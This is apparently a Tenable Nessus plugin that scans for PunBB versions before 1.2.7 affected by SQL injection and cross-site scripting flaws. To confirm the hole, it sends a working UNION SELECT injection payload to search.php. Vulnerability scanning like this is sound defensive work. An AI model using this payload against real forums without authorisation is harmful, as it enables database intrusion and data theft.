#
# (C) Tenable Network Security, Inc.
# 



include("compat.inc");

if (description) {
  script_id(19705);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2005-4665");
  script_bugtraq_id(14806, 14808);
  script_osvdb_id(19382);

  name["english"] = "PunBB < 1.2.7 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains several PHP scripts that are prone to
SQL injection and cross-site scripting attacks." );
 script_set_attribute(attribute:"description", value:
"The version of PunBB installed on the remote host suffers from several
flaws. 

  - Multiple SQL Injection Vulnerabilities
    The application fails to adequately sanitize user-
    supplied input to the 'search_id' parameter of the 
    'search' script as well as an unspecified parameter
    in one of the admin scripts before using it in SQL 
    queries. The first issue can be successfully exploited
    without authentication but does require that PHP's 
    'register_globals' setting be enabled while the 
    second requires an attacker first authenticate as an 
    admin or moderator.

  - A Cross-Site Scripting Vulnerability
    The application also does not sufficiently sanitize 
    input passed in 'url' BBcode tags before using it 
    in a post, which permits cross-site scripting
    attacks such as theft of authentication cookies." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/archive/1/422088/100/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/422267/100/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.punbb.org/changelogs/1.2.6_to_1.2.7.txt" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to PunBB 1.2.7 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/09/15");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/09/02");
 script_cvs_date("$Date: 2015/02/11 21:07:50 $");
 script_set_attribute(attribute:"patch_publication_date", value: "2005/09/02");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
  summary["english"] = "Checks for multiple vulnerabilities in PunBB < 1.2.7";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencie("punBB_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/punBB");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/punBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # Check whether the script 'search.php' exists -- it's used in the exploit.
  r = http_send_recv3(method: "GET", item:string(dir, "/search.php"), port:port);
  if (isnull(r)) exit(0);

  # If it does...
  if (egrep(string: r[2], pattern:'<form.* method="get" action="search.php">')) {
    # Try to exploit the flaw to return a list of topics.
    postdata = string("search_id=0+UNION+SELECT+'", 'a:5:{s:14:"search_results";s:4:"t.id";s:8:"num_hits";i:9999;s:7:"sort_by";i:0;s:8:"sort_dir";s:4:"DESC";s:7:"show_as";s:6:"topics";}', "'--");
    r = http_send_recv3(method: "POST", port: port, data: postdata,
  item: strcat(dir, "/search.php?action=search&keywords=", SCRIPT_NAME),
  add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
    if (isnull(r)) exit(0);

    # There's a problem if it looks like a list of topics.
    if (egrep(string: r[2], pattern:'<p class="pagelink">Pages:.+search_id=0 UNION SELECT')) {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }

    # Check the version number in case register_globals is disabled.
    if (ver =~ "^(0\.|1\.([01]\.|2\.[0-6][^0-9]?))") {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
